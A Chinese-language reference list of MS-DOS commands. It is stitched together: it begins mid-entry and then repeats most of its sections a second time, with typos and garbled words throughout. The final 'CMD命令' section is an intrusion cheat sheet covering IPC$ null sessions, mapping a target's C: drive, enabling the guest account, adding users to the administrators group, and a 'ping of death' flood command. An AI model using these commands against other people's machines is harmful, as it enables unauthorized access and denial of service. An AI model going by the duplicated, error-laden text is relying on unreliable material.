DRIVE C:WILL BE LOST ！ 
Proceed with format (Y/N)？ 
（警告：所有数据在C盘上，将会丢失，确实要继续格式化吗？） 
（2）若是对软盘进行格式化，则会如下提示：Insert mew diskette for drive A; 
and press ENTER when ready… 
（在A驱中插入新盘，准备好后按回车键）。 
（3）选用[/S]参数，将把DOS系统文件IO.SYS
、MSDOS.SYS及COMMAND.COM复制到磁盘上，使该磁盘可以做为DOS启动盘。若不选用/S参数，则格式化后的磙盘只能读写信息，而不能做为启动盘； 
（4）选用[/4]参数，在1.2MB的高密度软驱中格式化360KB的低密度盘； 
（5）选用[/Q]参数，快速格式化，这个参数并不会重新划分磁盘的磁道貌岸然和扇区，只能将磁盘根目录、文件分配表以及引导扇区清成空白，因此，格式化的速度较快。 
（6）选用[/u]参数，表示无条件格式化，即破坏原来磁盘上所有数据。不加/U，则为安全格式化，这时先建立一个镜象文件保存原来的FAT表和根目录，必要时可用UNFORRMAT恢复原来的数据。 
（二）UNformAT恢复格式化命令 
1．功能：对进行过格式化误操作丢失数据的磁盘进行恢复。 
2．类型：外部命令 
3．格式：UNformAT〈盘符〉[/L][/u]

[/TEST] 
4．使用说明：用于将被“非破坏性”格式化的磁盘恢复。根目录下被删除的文件或子目录及磁盘的系统扇区（包括FAT、根目录、BOOT扇区及硬盘分区表）受损时，也可以用UNformAT来抢救。 
（1）选用/L参数列出找到的子目录名称、文件名称、大孝日期等信息，但不会真的做formAT工作。 
（2）选用/P参数将显示于屏幕的报告（包含/L参数所产生的信息）同时也送到打印机。运行时屏幕会显示：“Print out will
be sent to LPT1” 
（3）选用/TEST参数只做模拟试验（TEST）不做真正的写入动作。使用此参数屏幕会显示：“Simulation only” 
（4）选用/U参数不使用MIRROR映像文件的数据，直接根据磁盘现状进行UNformAT。 
（5）选用/PSRTN；修复硬盘分区表。 
若在盘符之后加上/P、/L、/TEST之一，都相当于使用了/U参数，UNformAT会“假设”此时磁盘没有MIRROR映像文件。 
注意：UNformAT对于刚formAT的磁盘，可以完全恢复，但formAT后若做了其它数据的写入，则UNformAT就不能完整的救回数据了。UNformAT并非是万能的，由于使用UNformAT会重建FAT与根目录，所以它也具有较高的危险性，操作不当可能会扩大损失，如果仅误删了几个文件或子目录，只需要利用UNDELETE就够了。
三） CHKDSK——检查磁盘当前状态命令 
1．功能：显示磁盘状态、内存状态和指定路径下指定文件的不连续数目。 
2．类型：外部命令 
3．格式：CHKDSK [盘符：][路径][文件名][/F][/V] 
4．使用说明： 
（1）选用[文件名]参数，则显示该文件占用磁盘的情况； 
（2）选[/F]参数，纠正在指定磁盘上发现的逻辑错误； 
（3）选用[/V]参数，显示盘上的所有文件和路径。 
（四）DISKCOPY——整盘复制命令 
1．功能：复制格式和内容完全相同的软盘。 
2．类型：外部命令 
3．格式：DISKCOPY[盘符1：][盘符2：] 
4．使用说明： 
（1）如果目标软盘没有格式化，则复制时系统自动选进行格式化。 
（2）如果目标软盘上原有文件，则复制后将全部丢失。 
（3）如果是单驱动器复制，系统会提示适时更换源盘和目标盘，请操作时注意分清源盘和目标盘。 
（五）LABEL——建立磁盘卷标命令 
1．功能：建立、更改、删除磁盘卷标。 
2．类型：外部命令 
3．格式：LABEL[盘符：][卷标名] 
4．使用说明： 
（1）卷标名为要建立的卷标名，若缺省此参数，则系统提示键入卷标名或询问是否删除原有的卷标名； 
（2）卷标名由1至11个字符组成。 
（六）VOL——显示磁盘卷标命令 
1．功能：查看磁盘卷标号。 
2．类型：内部命令 
3．格式：VOL[盘符：] 
4．使用说明：省略盘符，显示当前驱动器卷标。 
（七）SCANDISK——检测、修复磁盘命令 
1．功能：检测磁盘的FAT表、目录结构、文件系统等是否有问题，并可将检测出的问题加以修复。 
2．类型：外部命令 
3．格式：SCANDISK[盘符1：]{[盘符2：]…}[/ALL] 
4．使用说明： 
（1）CCANDISK适用于硬盘和软盘，可以一次指定多个磁盘或选用[/ALL]参数指定所有的磁盘； 
（2）可自动检测出磁盘中所发生的交叉连接、丢失簇和目录结构等逻辑上的错误，并加以修复。 
（八）DEFRAG——重整磁盘命令 
1．。功能：整理磁盘，消除磁盘碎块。 
2．类型：外部命令 
3．格式：DEFRAG[盘符：][/F] 
4．使用说明：选用/F参数，将文件中存在盘上的碎片消除，并调整磁盘文件的安排，确保文件之间毫无空隙。从而加快读盘速度和节省磁盘空间。 
（九）SYS——系统复制命令 
1．功能：将当前驱动器上的DOS系统文件IO.SYS,MSDOS.SYS和COMMAND.COM 传送到指定的驱动器上。 
2．类型：外部命令 
3．格式：SYS[盘符：] 
*使用说明：如果磁盘剩余空间不足以存放系统文件，则提示：No roomfor on destination disk.

文件操作类命令 
（一） COPY文件复制命令 
1．功能：拷贝一个或多个文件到指定盘上。 
2．类型：内部命令 
3．格式：COPY [源盘][路径]〈源文件名〉[目标盘][路径][目标文件名] 
4．使用说明： 
（1）COPY是文件对文件的方式复制数据，复制前目标盘必须已经格式化； 
（2）复制过程中，目标盘上相同文件名称的旧文件会被源文件取代； 
（3）复制文件时，必须先确定目标般有足够的空间，否则会出现；insufficient的错误信息，提示磁盘空间不够； 
（4）文件名中允许使用通配举“*”“？”，可同时复制多个文件； 
（5）COPY命令中源文件名必须指出，不可以省略。 
（6）复制时，目标文件名可以与源文件名相同，称作“同名拷贝”此时目标文件名可以省略； 
（7）复制时，目标文件名也可以与源文件名不相同，称作“异名拷贝”，此时，目标文件名不能省略； 
（8）复制时，还可以将几个文件合并为一个文件，称为“合并拷贝”，格式如下：COPY；[源盘][路径]〈源文件名1〉〈源文件名2〉…[目标盘][路径]〈目标文件名〉； 
（9）利用COPY命令，还可以从键盘上输入数据建立文件，格式如下：COPY CON [盘符：][路径]〈文件名〉； 
（10）注意：COPY命令的使用格式，源文件名与目标文件名之间必须有空格！ 
（二）XCOPY——目录复制命令 
1．功能：复制指定的目录和目录下的所有文件连同目录结构。 
2．类型：外部命令 
3．格式：XCOPY [源盘：]〈源路径名〉[目标盘符：][目标路径名][/S][/V][/E] 
4．使用说明： 
（1）XCOPY是COPY的扩展，可以把指定的目录连文件和目录结构一并拷贝，但不能拷贝隐藏文件和系统文件； 
（2）使用时源盘符、源目标路径名、源文件名至少指定一个； 
（3）选用/S时对源目录下及其子目录下的所有文件进行COPY。除非指定/E参数，否则/S不会拷贝空目录，若不指定/S参数，则XCOPY只拷贝源目录本身的文件，而不涉及其下的子目录； 
（4）选用/V参数时，对的拷贝的扇区都进行较验，但速度会降低。 
（三）TYPE——显示文件内容命令 
1．功能：显示ASCII码文件的内容。 
2．类型：内部命令。 
3．格式：TYPE[盘符：][路径]〈文件名〉 
4．使用说明： 
（1）显示由ASCII码组成的文本文件，对。EXE.COM等为扩展名的文件，其显示的内容是无法阅读的，没有实际意义2； 
（2）该命令一次只可以显示一个文件的内容，不能使用通配符； 
（3）如果文件有扩展名，则必须将扩展名写上； 
（4）当文件较长，一屏显示不下时，可以按以下格式显示；TYPE[盘符：][路径]〈文件名〉|MORE，MORE为分屏显示命令，使用些参数后当满屏时会暂停，按任意键会继续显示。 
（5）若需将文件内容打印出来，可用如下格式： 
TYPE[盘符：][路径]〈文件名〉，＞PRN 
此时，打印机应处于联机状态。 
（四） REN——文件改名命令 
1．功能：更改文件名称 
2．类型：内部命令 
3．格式：REN[盘符：][路径]〈旧文件名〉〈新文件名〉 
4．使用说明： 
（1）新文件名前不可以加上盘符和路径，因为该命令只能对同一盘上的文件更换文件名； 
（2）允许使用通配符更改一组文件名或扩展名。 
（五）FC——文件比较命令 
1．功能：比较文件的异同，并列出差异处。 
2．类型：外部命令 
3．格式：FC[盘符：][路径名]〈文件名〉[盘符：][路径名][文件名][/A][/C][/N] 
4．使用说明： 
（1）选用/A参数，为ASCII码比较模式； 
（2）选用/B参数，为二进制比较模式； 
（3）选用/C参数，将大小写字符看成是相同的字符。 
（4）选用/N参数，在ASCII码比较方式下，显示相异处的行号。 
（六）ATTRIB——修改文件属性命令 
1．功能：修改指定文件的属性。（文件属性参见2.5.4（二）文件属性一节） 
2．类型：外部命令。 
3．格式：ATTRIB[文件名][R][——R][A][——A][H][——H][——S] 
4．使用说明： 
（1）选用R参数，将指定文件设为只读属性，使得该文件只能读取，无法写入数据或删除；选用——R参数，去除只读属性； 
（2）选用A参数，将文件设置为档案属性；选用——A参数，去除档案属性；  （3）选用H参数，将文件调协为隐含属性；选用——H参数，去隐含属性； 
（4）选用S参数，将文件设置为系统属性；选用——S参数，去除系统属性；  （5）选用/S参数，对当前目录下的所有子目录及作设置。 
七） DEL——删除文件命令 
1．功能：删除指定的文件。 
2．类型：内部命令 
3．格式：DEL[盘符：][路径]〈文件名〉

 
4．使用说明： 
（1）选用/P参数，系统在删除前询问是否真要删除该文件，若不使用这个参数，则自动删除； 
（2）该命令不能删除属性为隐含或只读的文件；
（3）在文件名称中可以使用通配符；
（4）若要删除磁盘上的所有文件（DEL*·*或DEL·），则会提示：(Arey ou sure？）（你确定吗？）若回答Y，则进行删除，回答N，则取消此次删除作业。
    （八） UNDELETE——恢复删除命令
    1．功能：恢复被误删除命令
    2．类型：外部命令。
    3．格式：UNDELETE[盘符：][路径名]〈文件名〉[/DOS]/LIST][/ALL]
    4．使用说明：使用UNDELETE可以使用“*”和“？”通配符。
    （1）选用/DOS参数根据目录里残留的记录来恢复文件。由于文件被删除时，目录所记载斩文件名第一个字符会被改为E5，DOS即依据文件开头的E5和其后续的字符来找到欲恢复的文件，所以，UNDELETE会要求用户输入一个字符，以便将文件名字补齐。但此字符不必和原来的一样，只需符合DOS的文件名规则即可。
    （2）选用/LIST只“列出”符合指定条件的文件而不做恢复，所以对磁盘内容完全不会有影响。
    （3）选用/ALL自动将可完全恢复的文件完全恢复，而不一一地询问用户，使用此参数时，若UNDELTE利用目录里残留的记录来将文件恢复，则会自动选一个字符将文件名补齐，并且使其不与现存文件名相同，选用字符的优选顺序为：#%——0000123456789A~Z。

   
        UNDELETE还具有建立文件的防护措施的功能，已超出本课程授课范围，请读者在使用些功能时查阅有关DOS手册。
    七、其它命令
    （一）CLS——清屏幕命令
    1功能：清除屏幕上的所有显示，光标置于屏幕左上角。
    2类型：内部命令
    3格式：CLS
    （二） VER查看系统版本号命令
    1功能：显示当前系统版本号
    2类型：内部命令
    3格式：VER
    （三） DATA日期设置命令
    1功能：设置或显示系统日期。
    2类型：内部命令
    3格式：DATE[mm——dd——yy]
    4使用说明：
    （1）省略[mm——dd——yy]显示系统日期并提示输入新的日期，不修改则可直接按回车键，[mm——dd——yy]为“月月——日日——年年”格式；
    （2）当机器开始启动时，有自动处理文件（AUTOEXEC.BAT）被执行，则系统不提示输入系统日期。否则，提示输入新日期和时间。
    （四） TIME系统时钟设置命令
    1功能：设置或显示系统时期。
    2类型：内部命令
    3格式：TIME[hh：mm：ss：xx]
    4使用说明：
    （1）省略[hh：mm：ss：xx]，显示系统时间并提示输入新的时间，不修改则可直接按回车键，[hh：mm：ss：xx]为“小时：分钟：秒：百分之几秒”格式；
    （2）当机器开始启动时，有自动处理文件（AUTOEXEC.BAT）被执行，则系统不提示输入系统日期。否则，提示输入新日期和时间。
    （五）MEM查看当前内存状况命令
    1功能：显示当前内存使用的情况
    2类型：外部命令
    3格式：MEM[/C][/F][/M]

    4使用说明：
    （1）选用/C参数列出装入常规内存和CMB的各文件的长度，同时也显示内存空间的使用状况和最大的可用空间；
    （2）选用/F参数分别列出当前常规内存剩余的字节大小和UMB可用的区域及大小；  
    （3）选用/M参数显示该模块使用内存地地址、大小及模块性质；
    （4）选用/P参数指定当输出超过一屏时，暂停供用户查看。
    （六） MSD显示系统信息命令
    1功能：显示系统的硬件和操作系统的状况。
    2类型：外部命令
    3格式：MSD[/S]
    4使用说明：
    （1）选用/I参数时，不检测硬件；
    （2）选用/B参数时，以黑白方式启动MSD；
    （3）选用/S参数时，显示出简明的系统报告。 









DOS命令大全

DOS命令大全
一）MD——建立子目录  
1．功能：创建新的子目录 
2．类型：内部命令 
3．格式：MD[盘符：][路径名]〈子目录名〉 
4．使用说明： 
（1）“盘符”：指定要建立子目录的磁盘驱动器字母，若省略，则为当前驱动器； 
（2）“路径名”：要建立的子目录的上级目录名，若缺省则建在当前目录下。 
例：（1）在C盘的根目录下创建名为FOX的子目录；（2）在FOX子目录下再创建USER子目录。 
C：、＞MD FOX （在当前驱动器C盘下创建子目录FOX） 
C：、＞MD FOX 、USER （在FOX 子目录下再创建USER子目录） 
（二）CD——改变当前目录 
1．功能：显示当前目录 
2．类型：内部命令 
3．格式：CD[盘符：][路径名][子目录名] 
4．使用说明： 
（1）如果省略路径和子目录名则显示当前目录； 
（2）如采用“CD、”格式，则退回到根目录； 
（3）如采用“CD.。”格式则退回到上一级目录。 
例：（1）进入到USER子目录；（2）从USER子目录退回到子目录；（3）返回到根目录。 
C:、＞CD FOX 、USER（进入FOX子目录下的USER子目录） 
C:、FOX、USER＞CD.。 （退回上一级根目录） 
C：、FOX＞CD、 （返回到根目录） 
C：、＞ 
（三）RD——删除子目录命令 
1．功能：从指定的磁盘删除了目录。 
2．类型：内部命令 
3．格式：RD[盘符：][路径名][子目录名] 
4．使用说明： 
（1）子目录在删除前必须是空的，也就是说需要先进入该子目录，使用DEL（删除文件的命令）将其子目录下的文件删空，然后再退回到上一级目录，用RD命令删除该了目录本身； 
（2）不能删除根目录和当前目录。 
例：要求把C盘FOX子目录下的USER子目录删除，操作如下： 
第一步：先将USER子目录下的文件删空； 
C、＞DEL C：、FOX、USER、*。* 
第二步，删除USER子目录。 
C、＞RD C：、FOX、USER 
（四）DIR——显示磁盘目录命令 
1．功能：显示磁盘目录的内容。 
2．类型：内部命令 
3．格式：DIR [盘符][路径][/P][/W] 
4．
使用说明：/P的使用；当欲查看的目录太多，无法在一屏显示完屏幕会一直往上卷，不容易看清，加上/P参数后，屏幕上会分面一次显示23行的文件信息，然后暂停，并提示；Press
any key to continue 
/W的使用：加上/W只显示文件名，至于文件大小及建立的日期和时间则都省略。加上参数后，每行可以显示五个文件名。 
PATH——路径设置命令 
1．功能：设备可执行文件的搜索路径，只对文件有效。 
2．类型：内部命令 
3．格式：PATH[盘符1]目录[路径名1]{[；盘符2：]，〈目录路径名2〉…} 
4．使用说明： 
（1）当运行一个可执行文件时，DOS会先在当前目录中搜索该文件，若找到则运行之；若找不到该文件，则根据PATH命令所设置的路径，顺序逐条地到目录中搜索该文件； 
（2）PATH命令中的路径，若有两条以上，各路径之间以一个分号“；”隔开； 
（3）PATH命令有三种使用方法： 
PATH[盘符1：][路径1][盘符2：][路径2]…（设定可执行文件的搜索路径）  PATH：（取消所有路径） 
PATH：（显示目前所设的路径） 
（六）TREE——显示磁盘目录结构命令 
1．功能：显示指定驱动器上所有目录路径和这些目录下的所有文件名。 
2．类型：外部命令 
3．格式：TREE[盘符：][/F][》PRN] 
4．使用说明： 
（1）使用/F参数时显示所有目录及目录下的所有文件，省略时，只显示目录，不显示目录下的文件； 
（2）选用＞PRN参数时，则把所列目录及目录中的文件名打印输出。 
（七）DELTREE——删除整个目录命令 
1．功能：将整个目录及其下属子目录和文件删除。 
2．类型：外部命令 
3．格式：DELTREE[盘符：]〈路径名〉 
4．使用说明：该命令可以一步就将目录及其下的所有文件、子目录、更下层的子目录一并删除，而且不管文件的属性为隐藏、系统或只读，只要该文件位于删除的目录之下，DELTREE都一视同仁，照删不误。使用时务必小心！！！ 
五、磁盘操作类命令 
（一）formAT——磁盘格式化命令 
1．功能：对磁盘进行格式化，划分磁道和扇区；同时检查出整个磁盘上有无带缺陷的磁道，对坏道加注标记；建立目录区和文件分配表，使磁盘作好接收DOS的准备。 
2．类型：外部命令 
3．格式：formAT〈盘符：〉[/S][/4][/Q] 
4．使用说明： 
（1）命令后的盘符不可缺省，若对硬盘进行格式化，则会如下列提示：WARNING:ALL DATA ON NON
——REMOVABLE DISK 
DRIVE C:WILL BE LOST ！ 
Proceed with format (Y/N)？ 
（警告：所有数据在C盘上，将会丢失，确实要继续格式化吗？） 
（2）若是对软盘进行格式化，则会如下提示：Insert mew diskette for drive A; 
and press ENTER when ready… 
（在A驱中插入新盘，准备好后按回车键）。 
（3）选用[/S]参数，将把DOS系统文件IO.SYS
、MSDOS.SYS及COMMAND.COM复制到磁盘上，使该磁盘可以做为DOS启动盘。若不选用/S参数，则格式化后的磙盘只能读写信息，而不能做为启动盘； 
（4）选用[/4]参数，在1.2MB的高密度软驱中格式化360KB的低密度盘； 
（5）选用[/Q]参数，快速格式化，这个参数并不会重新划分磁盘的磁道貌岸然和扇区，只能将磁盘根目录、文件分配表以及引导扇区清成空白，因此，格式化的速度较快。 
（6）选用[/U]参数，表示无条件格式化，即破坏原来磁盘上所有数据。不加/U，则为安全格式化，这时先建立一个镜象文件保存原来的FAT表和根目录，必要时可用UNFORRMAT恢复原来的数据。 
（二）UNformAT恢复格式化命令 
1．功能：对进行过格式化误操作丢失数据的磁盘进行恢复。 
2．类型：外部命令 
3．格式：UNformAT〈盘符〉[/L][/U][/P][/TEST] 
4．使用说明：用于将被“非破坏性”格式化的磁盘恢复。根目录下被删除的文件或子目录及磁盘的系统扇区（包括FAT、根目录、BOOT扇区及硬盘分区表）受损时，也可以用UNformAT来抢救。 
（1）选用/L参数列出找到的子目录名称、文件名称、大孝日期等信息，但不会真的做formAT工作。 
（2）选用/P参数将显示于屏幕的报告（包含/L参数所产生的信息）同时也送到打印机。运行时屏幕会显示：“Print out will
be sent to LPT1” 
（3）选用/TEST参数只做模拟试验（TEST）不做真正的写入动作。使用此参数屏幕会显示：“Simulation only” 
（4）选用/U参数不使用MIRROR映像文件的数据，直接根据磁盘现状进行UNformAT。 
（5）选用/PSRTN；修复硬盘分区表。 
若在盘符之后加上/P、/L、/TEST之一，都相当于使用了/U参数，UNformAT会“假设”此时磁盘没有MIRROR映像文件。 
注意：UNformAT对于刚formAT的磁盘，可以完全恢复，但formAT后若做了其它数据的写入，则UNformAT就不能完整的救回数据了。UNformAT并非是万能的，由于使用UNformAT会重建FAT与根目录，所以它也具有较高的危险性，操作不当可能会扩大损失，如果仅误删了几个文件或子目录，只需要利用UNDELETE就够了。
三） CHKDSK——检查磁盘当前状态命令 
1．功能：显示磁盘状态、内存状态和指定路径下指定文件的不连续数目。 
2．类型：外部命令 
3．格式：CHKDSK [盘符：][路径][文件名][/F][/V] 
4．使用说明： 
（1）选用[文件名]参数，则显示该文件占用磁盘的情况； 
（2）选[/F]参数，纠正在指定磁盘上发现的逻辑错误； 
（3）选用[/V]参数，显示盘上的所有文件和路径。 
（四）DISKCOPY——整盘复制命令 
1．功能：复制格式和内容完全相同的软盘。 
2．类型：外部命令 
3．格式：DISKCOPY[盘符1：][盘符2：] 
4．使用说明： 
（1）如果目标软盘没有格式化，则复制时系统自动选进行格式化。 
（2）如果目标软盘上原有文件，则复制后将全部丢失。 
（3）如果是单驱动器复制，系统会提示适时更换源盘和目标盘，请操作时注意分清源盘和目标盘。 
（五）LABEL——建立磁盘卷标命令 
1．功能：建立、更改、删除磁盘卷标。 
2．类型：外部命令 
3．格式：LABEL[盘符：][卷标名] 
4．使用说明： 
（1）卷标名为要建立的卷标名，若缺省此参数，则系统提示键入卷标名或询问是否删除原有的卷标名； 
（2）卷标名由1至11个字符组成。 
（六）VOL——显示磁盘卷标命令 
1．功能：查看磁盘卷标号。 
2．类型：内部命令 
3．格式：VOL[盘符：] 
4．使用说明：省略盘符，显示当前驱动器卷标。 
（七）SCANDISK——检测、修复磁盘命令 
1．功能：检测磁盘的FAT表、目录结构、文件系统等是否有问题，并可将检测出的问题加以修复。 
2．类型：外部命令 
3．格式：SCANDISK[盘符1：]{[盘符2：]…}[/ALL] 
4．使用说明： 
（1）CCANDISK适用于硬盘和软盘，可以一次指定多个磁盘或选用[/ALL]参数指定所有的磁盘； 
（2）可自动检测出磁盘中所发生的交叉连接、丢失簇和目录结构等逻辑上的错误，并加以修复。 
（八）DEFRAG——重整磁盘命令 
1．。功能：整理磁盘，消除磁盘碎块。 
2．类型：外部命令 
3．格式：DEFRAG[盘符：][/F] 
4．使用说明：选用/F参数，将文件中存在盘上的碎片消除，并调整磁盘文件的安排，确保文件之间毫无空隙。从而加快读盘速度和节省磁盘空间。 
（九）SYS——系统复制命令 
1．功能：将当前驱动器上的DOS系统文件IO.SYS,MSDOS.SYS和COMMAND.COM 传送到指定的驱动器上。 
2．类型：外部命令 
3．格式：SYS[盘符：] 
*使用说明：如果磁盘剩余空间不足以存放系统文件，则提示：No roomfor on destination disk. 

文件操作类命令 
（一） COPY文件复制命令 
1．功能：拷贝一个或多个文件到指定盘上。 
2．类型：内部命令 
3．格式：COPY [源盘][路径]〈源文件名〉[目标盘][路径][目标文件名] 
4．使用说明： 
（1）COPY是文件对文件的方式复制数据，复制前目标盘必须已经格式化； 
（2）复制过程中，目标盘上相同文件名称的旧文件会被源文件取代； 
（3）复制文件时，必须先确定目标般有足够的空间，否则会出现；insufficient的错误信息，提示磁盘空间不够； 
（4）文件名中允许使用通配举“*”“？”，可同时复制多个文件； 
（5）COPY命令中源文件名必须指出，不可以省略。 
（6）复制时，目标文件名可以与源文件名相同，称作“同名拷贝”此时目标文件名可以省略； 
（7）复制时，目标文件名也可以与源文件名不相同，称作“异名拷贝”，此时，目标文件名不能省略； 
（8）复制时，还可以将几个文件合并为一个文件，称为“合并拷贝”，格式如下：COPY；[源盘][路径]〈源文件名1〉〈源文件名2〉…[目标盘][路径]〈目标文件名〉； 
（9）利用COPY命令，还可以从键盘上输入数据建立文件，格式如下：COPY CON [盘符：][路径]〈文件名〉； 
（10）注意：COPY命令的使用格式，源文件名与目标文件名之间必须有空格！ 
（二）XCOPY——目录复制命令 
1．功能：复制指定的目录和目录下的所有文件连同目录结构。 
2．类型：外部命令 
3．格式：XCOPY [源盘：]〈源路径名〉[目标盘符：][目标路径名][/S][/V][/E] 
4．使用说明： 
（1）XCOPY是COPY的扩展，可以把指定的目录连文件和目录结构一并拷贝，但不能拷贝隐藏文件和系统文件； 
（2）使用时源盘符、源目标路径名、源文件名至少指定一个； 
（3）选用/S时对源目录下及其子目录下的所有文件进行COPY。除非指定/E参数，否则/S不会拷贝空目录，若不指定/S参数，则XCOPY只拷贝源目录本身的文件，而不涉及其下的子目录； 
（4）选用/V参数时，对的拷贝的扇区都进行较验，但速度会降低。 
（三）TYPE——显示文件内容命令 
1．功能：显示ASCII码文件的内容。 
2．类型：内部命令。 
3．格式：TYPE[盘符：][路径]〈文件名〉 
4．使用说明： 
（1）显示由ASCII码组成的文本文件，对。EXE.COM等为扩展名的文件，其显示的内容是无法阅读的，没有实际意义2； 
（2）该命令一次只可以显示一个文件的内容，不能使用通配符； 
（3）如果文件有扩展名，则必须将扩展名写上； 
（4）当文件较长，一屏显示不下时，可以按以下格式显示；TYPE[盘符：][路径]〈文件名〉|MORE，MORE为分屏显示命令，使用些参数后当满屏时会暂停，按任意键会继续显示。 
（5）若需将文件内容打印出来，可用如下格式： 
TYPE[盘符：][路径]〈文件名〉，＞PRN 
此时，打印机应处于联机状态。 
（四） REN——文件改名命令 
1．功能：更改文件名称 
2．类型：内部命令 
3．格式：REN[盘符：][路径]〈旧文件名〉〈新文件名〉 
4．使用说明： 
（1）新文件名前不可以加上盘符和路径，因为该命令只能对同一盘上的文件更换文件名； 
（2）允许使用通配符更改一组文件名或扩展名。 
（五）FC——文件比较命令 
1．功能：比较文件的异同，并列出差异处。 
2．类型：外部命令 
3．格式：FC[盘符：][路径名]〈文件名〉[盘符：][路径名][文件名][/A][/B][/C][/N] 
4．使用说明： 
（1）选用/A参数，为ASCII码比较模式； 
（2）选用/B参数，为二进制比较模式； 
（3）选用/C参数，将大小写字符看成是相同的字符。 
（4）选用/N参数，在ASCII码比较方式下，显示相异处的行号。 
（六）ATTRIB——修改文件属性命令 
1．功能：修改指定文件的属性。（文件属性参见2.5.4（二）文件属性一节） 
2．类型：外部命令。 
3．格式：ATTRIB[文件名][R][——R][A][——A][H][——H][——S] 
4．使用说明： 
（1）选用R参数，将指定文件设为只读属性，使得该文件只能读取，无法写入数据或删除；选用——R参数，去除只读属性； 
（2）选用A参数，将文件设置为档案属性；选用——A参数，去除档案属性；  （3）选用H参数，将文件调协为隐含属性；选用——H参数，去隐含属性； 
（4）选用S参数，将文件设置为系统属性；选用——S参数，去除系统属性；  （5）选用/S参数，对当前目录下的所有子目录及作设置。 
七） DEL——删除文件命令 
1．功能：删除指定的文件。 
2．类型：内部命令 
3．格式：DEL[盘符：][路径]〈文件名〉[/P] 
4．使用说明： 
（1）选用/P参数，系统在删除前询问是否真要删除该文件，若不使用这个参数，则自动删除； 
（2）该命令不能删除属性为隐含或只读的文件；
（3）在文件名称中可以使用通配符；
（4）若要删除磁盘上的所有文件（DEL*·*或DEL·），则会提示：(Arey ou sure？）（你确定吗？）若回答Y，则进行删除，回答N，则取消此次删除作业。
    （八） UNDELETE——恢复删除命令
    1．功能：恢复被误删除命令
    2．类型：外部命令。
    3．格式：UNDELETE[盘符：][路径名]〈文件名〉[/DOS]/LIST][/ALL]
    4．使用说明：使用UNDELETE可以使用“*”和“？”通配符。
    （1）选用/DOS参数根据目录里残留的记录来恢复文件。由于文件被删除时，目录所记载斩文件名第一个字符会被改为E5，DOS即依据文件开头的E5和其后续的字符来找到欲恢复的文件，所以，UNDELETE会要求用户输入一个字符，以便将文件名字补齐。但此字符不必和原来的一样，只需符合DOS的文件名规则即可。
    （2）选用/LIST只“列出”符合指定条件的文件而不做恢复，所以对磁盘内容完全不会有影响。
    （3）选用/ALL自动将可完全恢复的文件完全恢复，而不一一地询问用户，使用此参数时，若UNDELTE利用目录里残留的记录来将文件恢复，则会自动选一个字符将文件名补齐，并且使其不与现存文件名相同，选用字符的优选顺序为：#%——0000123456789A~Z。


   
        UNDELETE还具有建立文件的防护措施的功能，已超出本课程授课范围，请读者在使用些功能时查阅有关DOS手册。

    七、其它命令
    （一）CLS——清屏幕命令
    1功能：清除屏幕上的所有显示，光标置于屏幕左上角。
    2类型：内部命令
    3格式：CLS
    （二） VER查看系统版本号命令
    1功能：显示当前系统版本号
    2类型：内部命令
    3格式：VER
    （三） DATA日期设置命令
    1功能：设置或显示系统日期。
    2类型：内部命令
    3格式：DATE[mm——dd——yy]
    4使用说明：
    （1）省略[mm——dd——yy]显示系统日期并提示输入新的日期，不修改则可直接按回车键，[mm——dd——yy]为“月月——日日——年年”格式；
    （2）当机器开始启动时，有自动处理文件（AUTOEXEC.BAT）被执行，则系统不提示输入系统日期。否则，提示输入新日期和时间。
    （四） TIME系统时钟设置命令
    1功能：设置或显示系统时期。
    2类型：内部命令
    3格式：TIME[hh：mm：ss：xx]
    4使用说明：
    （1）省略[hh：mm：ss：xx]，显示系统时间并提示输入新的时间，不修改则可直接按回车键，[hh：mm：ss：xx]为“小时：分钟：秒：百分之几秒”格式；
    （2）当机器开始启动时，有自动处理文件（AUTOEXEC.BAT）被执行，则系统不提示输入系统日期。否则，提示输入新日期和时间。
    （五）MEM查看当前内存状况命令
    1功能：显示当前内存使用的情况
    2类型：外部命令
    3格式：MEM[/C][/F][/M][/P]
    4使用说明：
    （1）选用/C参数列出装入常规内存和CMB的各文件的长度，同时也显示内存空间的使用状况和最大的可用空间；
    （2）选用/F参数分别列出当前常规内存剩余的字节大小和UMB可用的区域及大小；  
    （3）选用/M参数显示该模块使用内存地地址、大小及模块性质；
    （4）选用/P参数指定当输出超过一屏时，暂停供用户查看。
    （六） MSD显示系统信息命令
    1功能：显示系统的硬件和操作系统的状况。
    2类型：外部命令
    3格式：MSD[/I][/B][/S]
    4使用说明：
    （1）选用/I参数时，不检测硬件；
    （2）选用/B参数时，以黑白方式启动MSD；
    （3）选用/S参数时，显示出简明的系统报告。

CMD命令 
net use ipipc$ " " /user:" " 建立IPC空链接 
net use ipipc$ "密码" /user:"用户名" 建立IPC非空链接 
net use h: ipc$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H: 
net use h: ipc$ 登陆后映射对方C：到本地为H: 
net use ipipc$ /del 删除IPC链接 
net use h: /del 删除映射对方到本地的为H:的映射 
net user 用户名 密码 /add 建立用户 
net user guest /active:yes 激活guest用户 
net user 查看有哪些用户 
net user 帐户名 查看帐户的属性 
net localgroup administrators 用户名 /add 把"用户"添加到管理员中使其具有管理员权限,注意： 
administrator后加s用复数 
net start 查看开启了哪些服务 
net start 服务名 开启服务；(如:net start telnet， net start schedule) 
net stop 服务名 停止某服务 
net time 目标ip 查看对方时间 
net time 目标ip /set 设置本地计算机时间与"目标IP"主机的时间同步,加上参数/yes可取消确认信息 
net view 查看本地局域网内开启了哪些共享 
net view ip 查看对方局域网内开启了哪些共享 
net config 显示系统网络设置 
net logoff 断开连接的共享 
net pause 服务名 暂停某服务 
net send ip "文本信息" 向对方发信息 
net ver 局域网内正在使用的网络连接类型和信息 
net share 查看本地开启的共享 
net share ipc$ 开启ipc$共享 
net share ipc$ /del 删除ipc$共享 
net share c$ /del 删除C：共享 
net user guest 12345 用guest用户登陆后用将密码改为12345 
net password 密码 更改系统登陆密码 
netstat -a 查看开启了哪些端口,常用netstat -an 
netstat -n 查看端口的网络连接情况，常用netstat -an 
netstat -v 查看正在进行的工作 
netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） 
netstat -s 查看正在使用的所有协议使用情况 
nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 
tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数："-w数字"用于设置超时间隔。 
ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数："-l[空格]数据包大小"；"-n发送数据次数"；"-t"指一直 
ping。 
ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) 
